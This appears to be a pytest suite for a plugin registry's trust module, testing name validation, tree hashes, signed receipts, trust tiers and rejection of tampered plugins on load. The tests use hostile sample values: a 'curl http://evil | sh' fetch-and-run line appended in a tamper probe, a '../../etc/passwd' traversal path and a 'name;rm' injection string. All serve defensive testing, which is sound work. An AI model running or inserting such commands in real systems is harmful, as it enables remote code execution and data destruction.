"""Tests for registry_trust.py: content-bound signatures re-verified on load.

Falsifiability (wq#2630 probe doctrine): the trust model's scope parameters
are the state dir, the trust-root dir, and the installed tree -- every test
pins all three to tmp_path, OUTSIDE the /var/lib/limpet and /etc/limpet/trust
defaults, and the tamper probes mutate real bytes on disk so a gate that
"verified" without recomputing the tree hash would fail here, not pass.

No real minisign: the verifier is the documented injection point, and the
fake is keyed (sha256 over key+payload) so a wrong key or altered payload is
an actual mismatch, never a rubber stamp. The missing-binary fail-closed path
is probed by stubbing subprocess.run to raise FileNotFoundError.
"""
import dataclasses
import hashlib
import os
import subprocess
import sys

import pytest

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from manifest import parse_manifest  # noqa: E402
from plugin_registry import Registry  # noqa: E402
import registry_trust  # noqa: E402
from registry_trust import (  # noqa: E402
    Receipt, TrustError, load_receipt, receipt_path, roots_for_tier,
    safe_name, save_receipt, signing_payload, tier_policy_errors, tree_hash,
    trust_gate, verify_receipt,
)


def fake_sign(payload: bytes, key: str) -> str:
    return hashlib.sha256(key.encode() + payload).hexdigest()


def fake_verify(payload: bytes, sig: str, key: str) -> bool:
    return sig == fake_sign(payload, key)


def make_tree(root, files):
    for rel, content in files.items():
        path = os.path.join(root, rel)
        os.makedirs(os.path.dirname(path), exist_ok=True)
        with open(path, "w", encoding="utf-8") as fh:
            fh.write(content)


def make_receipt(tmp_path, name="ubertooth", tier="community", key="authorkey",
                 files=None, **overrides):
    tree = str(tmp_path / f"store-{name}")
    os.makedirs(tree, exist_ok=True)
    make_tree(tree, files or {"limpet-plugin.toml": "x = 1\n", "install.sh": "#!/bin/sh\n"})
    th = tree_hash(tree)
    payload = signing_payload(name, "https://example.invalid/p.git", "a" * 40, th)
    fields = dict(
        name=name, git="https://example.invalid/p.git", rev="a" * 40,
        tree_hash=th, tier=tier, tree=tree, pubkey=key,
        sig=fake_sign(payload, key))
    fields.update(overrides)
    return Receipt(**fields)


# ---- name safety (reject-unsafe-name-before-write, spec §5.2.5) ----------
@pytest.mark.parametrize("name", ["ubertooth", "fw-diff", "ab", "a" * 32])
def test_safe_name_accepts_registry_grammar(name):
    assert safe_name(name)


@pytest.mark.parametrize("name", [
    "../evil", "a/b", "UPPER", "a", "a" * 33, "dotted.name", "under_score",
    "", None, "name;rm", "name\0x"])
def test_safe_name_rejects_unsafe(name):
    assert not safe_name(name)


def test_receipt_path_refuses_traversal_before_touching_fs(tmp_path):
    with pytest.raises(TrustError):
        receipt_path(str(tmp_path), "../../etc/passwd")
    assert list(tmp_path.iterdir()) == []  # nothing was written


# ---- tree hash ------------------------------------------------------------
def test_tree_hash_deterministic_and_content_sensitive(tmp_path):
    a, b = tmp_path / "a", tmp_path / "b"
    files = {"limpet-plugin.toml": "x=1\n", "sub/tool.py": "print(1)\n"}
    for root in (a, b):
        root.mkdir()
        make_tree(str(root), files)
    assert tree_hash(str(a)) == tree_hash(str(b))
    (b / "sub" / "tool.py").write_text("print(2)\n")
    assert tree_hash(str(a)) != tree_hash(str(b))


def test_tree_hash_ignores_git_dir_but_not_other_dirs(tmp_path):
    root = tmp_path / "t"
    root.mkdir()
    make_tree(str(root), {"f": "x"})
    base = tree_hash(str(root))
    make_tree(str(root), {".git/config": "noise"})
    assert tree_hash(str(root)) == base
    make_tree(str(root), {".github/workflows/ci.yml": "counted"})
    assert tree_hash(str(root)) != base


def test_signing_payload_is_canonical():
    one = signing_payload("n", "g", "r", "sha256:ab")
    two = signing_payload("n", "g", "r", "sha256:ab")
    assert one == two
    assert one != signing_payload("n", "g", "r2", "sha256:ab")


# ---- receipts --------------------------------------------------------------
def test_receipt_roundtrip(tmp_path):
    receipt = make_receipt(tmp_path, tier="vetted", elevated=True)
    save_receipt(str(tmp_path), receipt)
    assert load_receipt(str(tmp_path), "ubertooth") == receipt


def test_load_receipt_missing_is_none_malformed_raises(tmp_path):
    assert load_receipt(str(tmp_path), "ghost") is None
    bad = tmp_path / "trust" / "bad.json"
    bad.parent.mkdir()
    bad.write_text('{"name": "bad", "unexpected_field": 1}')
    with pytest.raises(TrustError):
        load_receipt(str(tmp_path), "bad")


# ---- verification -----------------------------------------------------------
def test_verify_receipt_ok_and_tamper_detected(tmp_path):
    receipt = make_receipt(tmp_path)
    assert verify_receipt(receipt, verifier=fake_verify, trust_dir=str(tmp_path / "no-roots")) == []
    # Tamper probe: flip one byte in the installed tree AFTER signing.
    with open(os.path.join(receipt.tree, "install.sh"), "a") as fh:
        fh.write("curl http://evil | sh\n")
    errors = verify_receipt(receipt, verifier=fake_verify, trust_dir=str(tmp_path / "no-roots"))
    assert any("tree hash mismatch" in e for e in errors)


def test_verify_receipt_wrong_key_fails(tmp_path):
    receipt = make_receipt(tmp_path, key="authorkey")
    forged = dataclasses.replace(receipt, pubkey="impostorkey")
    errors = verify_receipt(forged, verifier=fake_verify, trust_dir=str(tmp_path / "nr"))
    assert any("does not verify" in e for e in errors)


def test_core_tier_requires_core_root_not_receipt_key(tmp_path):
    """A core-tier receipt carrying its own pubkey must NOT self-verify --
    core trust comes only from /etc/limpet/trust/core.pub (spec §5.1)."""
    trust = tmp_path / "trust-roots"
    trust.mkdir()
    receipt = make_receipt(tmp_path, tier="core", key="selfkey")
    errors = verify_receipt(receipt, verifier=fake_verify, trust_dir=str(trust))
    assert any("no trust root" in e for e in errors)
    # Now ship the project root key the signature was actually made with.
    payload = signing_payload(receipt.name, receipt.git, receipt.rev, receipt.tree_hash)
    good = dataclasses.replace(receipt, sig=fake_sign(payload, "projectroot"), pubkey="")
    (trust / "core.pub").write_text("projectroot")
    assert verify_receipt(good, verifier=fake_verify, trust_dir=str(trust)) == []


def test_vetted_tier_accepts_reviewer_key(tmp_path):
    trust = tmp_path / "roots"
    trust.mkdir()
    (trust / "vetted-alice.pub").write_text("alicekey")
    receipt = make_receipt(tmp_path, tier="vetted", key="")
    payload = signing_payload(receipt.name, receipt.git, receipt.rev, receipt.tree_hash)
    receipt = dataclasses.replace(receipt, sig=fake_sign(payload, "alicekey"))
    assert verify_receipt(receipt, verifier=fake_verify, trust_dir=str(trust)) == []


def test_unlisted_unsigned_passes_hash_check_only(tmp_path):
    receipt = make_receipt(tmp_path, tier="unlisted", sig="", pubkey="")
    assert verify_receipt(receipt, verifier=fake_verify, trust_dir=str(tmp_path / "nr")) == []
    # ...but a signed tier with no signature fails closed.
    community = dataclasses.replace(receipt, tier="community")
    errors = verify_receipt(community, verifier=fake_verify, trust_dir=str(tmp_path / "nr"))
    assert any("no signature" in e for e in errors)


def test_minisign_missing_binary_fails_closed(monkeypatch):
    def no_binary(*a, **k):
        raise FileNotFoundError("minisign")
    monkeypatch.setattr(subprocess, "run", no_binary)
    with pytest.raises(TrustError):
        registry_trust.minisign_verify(b"payload", "sig", "key")


def test_roots_for_tier_mapping():
    roots = {"core": "CORE", "vetted-a": "VA", "index-x": "IX", "stray": "S"}
    assert roots_for_tier("core", roots) == ["CORE"]
    assert set(roots_for_tier("vetted", roots)) == {"CORE", "VA"}
    assert roots_for_tier("community", roots, "AUTHOR") == ["IX", "AUTHOR"]


# ---- tier policy (wq#3961 reconciliation, spec §7.2) -----------------------
ESCALATING = parse_manifest("""
[plugin]
name = "flashrom"
version = "1.0"
kind = "tool"
[mutation]
escalates = true
writes = ["device"]
""")

BENIGN = parse_manifest("""
[plugin]
name = "strings-plus"
version = "1.0"
kind = "tool"
""")


def test_tier_policy_blocks_unprivileged_tiers(tmp_path):
    community = make_receipt(tmp_path, name="flashrom", tier="community")
    assert tier_policy_errors(ESCALATING, community)
    assert tier_policy_errors(ESCALATING, None)  # no receipt = unlisted floor
    assert tier_policy_errors(ESCALATING, dataclasses.replace(community, tier="vetted")) == []
    assert tier_policy_errors(ESCALATING, dataclasses.replace(community, elevated=True)) == []
    assert tier_policy_errors(BENIGN, None) == []


# ---- the load gate, end to end through Registry.scan -----------------------
def write_dropin(plugins_dir, name, body):
    os.makedirs(plugins_dir, exist_ok=True)
    with open(os.path.join(plugins_dir, f"{name}.toml"), "w", encoding="utf-8") as fh:
        fh.write(body)


def test_registry_rejects_tampered_plugin_on_load(tmp_path):
    """The spec's single most important departure from VSCode (§5.2.4): a
    plugin that verified at install but was modified on disk afterwards must
    fail to LOAD on the next scan."""
    state, plugins = str(tmp_path / "state"), str(tmp_path / "plugins.d")
    receipt = make_receipt(tmp_path, name="ubertooth")
    save_receipt(state, receipt)
    write_dropin(plugins, "ubertooth",
                 '[plugin]\nname = "ubertooth"\nversion = "1.0"\nkind = "tool"\n')
    gate = trust_gate(state, trust_dir=str(tmp_path / "nr"), verifier=fake_verify)
    reg = Registry(plugins_dir=plugins, state_dir=state, trust_gate=gate)
    assert "ubertooth" in reg.scan().loaded  # verifies clean
    with open(os.path.join(receipt.tree, "install.sh"), "a") as fh:
        fh.write("payload\n")
    report = reg.scan()
    assert "ubertooth" not in report.loaded
    [errors] = list(report.rejected.values())
    assert any("tree hash mismatch" in e for e in errors)


def test_registry_default_gate_allows_receiptless_dropins(tmp_path):
    """Hand-dropped manifests (the pre-registry workflow) keep loading under
    the DEFAULT gate -- but only until they ask for privilege."""
    state, plugins = str(tmp_path / "state"), str(tmp_path / "plugins.d")
    write_dropin(plugins, "strings-plus",
                 '[plugin]\nname = "strings-plus"\nversion = "1.0"\nkind = "tool"\n')
    write_dropin(plugins, "flashrom",
                 '[plugin]\nname = "flashrom"\nversion = "1.0"\nkind = "tool"\n'
                 '[mutation]\nescalates = true\nwrites = ["device"]\n')
    reg = Registry(plugins_dir=plugins, state_dir=state)  # default trust gate
    report = reg.scan()
    assert "strings-plus" in report.loaded
    assert "flashrom" not in report.loaded
    [errors] = [e for e in report.rejected.values()]
    assert any("tier policy" in e for e in errors)
